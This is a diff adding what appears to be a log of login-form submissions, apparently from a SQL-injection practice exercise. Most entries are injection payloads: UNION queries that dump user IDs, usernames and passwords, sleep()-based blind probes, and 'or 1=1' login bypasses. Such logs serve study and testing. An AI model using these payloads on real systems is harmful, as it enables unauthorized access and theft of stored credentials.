@@ -1,0 +1,52 @@
+User Name:
+Password:
+User Name:
+Password:
+User Name:
+Password:
+User Name:sadasdasdas
+Password:sadasd
+User Name:abc'  union select 1,group_concat(id,username,password) from users #
+Password:abc'  union select 1,group_concat(id,username,password) from users #
+User Name:asdasd;;;
+Password:asdasd;;;
+User Name:abc"  union select 1,group_concat(id,username,password) from users #
+Password:abc"  union select 1,group_concat(id,username,password) from users #
+User Name:abc"  union select 1,group_concat(id,username,password) from users #
+Password:abc"  union select 1,group_concat(id,username,password) from users #
+User Name:abc"  union select 1,group_concat(id,username,password) from users #
+Password:abc"  union select 1,group_concat(id,username,password) from users #
+User Name:abc"  union select 1,group_concat(id,username,password) from users #
+Password:abc"  union select 1,group_concat(id,username,password) from users #
+User Name:abc"  union select 1,group_concat(id,username,password) from users #
+Password:abc"  union select 1,group_concat(id,username,password) from users #
+User Name:1' and if(length (database())=8 , sleep(10), null) --+
+Password:1' and if(length (database())=8 , sleep(10), null) --+
+User Name:1"
+Password:1"
+User Name:admin" union select 1,2,3 #
+Password:admin" union select 1,2,3 #
+User Name:admin" union select 1,2,3#
+Password:admin" union select 1,2,3#
+User Name:1" union select 1,2,3#
+Password:1" union select 1,2,3#
+User Name:1' and if(length (database())=8 , sleep(10), null) --+
+Password:1' and if(length (database())=8 , sleep(10), null) --+
+User Name:1'
+Password:1'
+User Name:1"
+Password:1"
+User Name:1213") union select 1,database(),3 #
+Password:213") union select 1,database(),3 #
+User Name:1213") union select 1,2,3 #
+Password:213") union select 1,2,3 #
+User Name:1' and if(length (database())=8 , sleep(10), null) --+
+Password:1' and if(length (database())=8 , sleep(10), null) --+
+User Name:admin' or '1'='1
+Password:admin' or '1'='1
+User Name:admin" or "1"="1
+Password:admin" or "1"="1
+User Name:admin" or "1"="1"#
+Password:admin" or "1"="1"#
+User Name:admin' or '1'='1
+Password:admin' or '1'='1
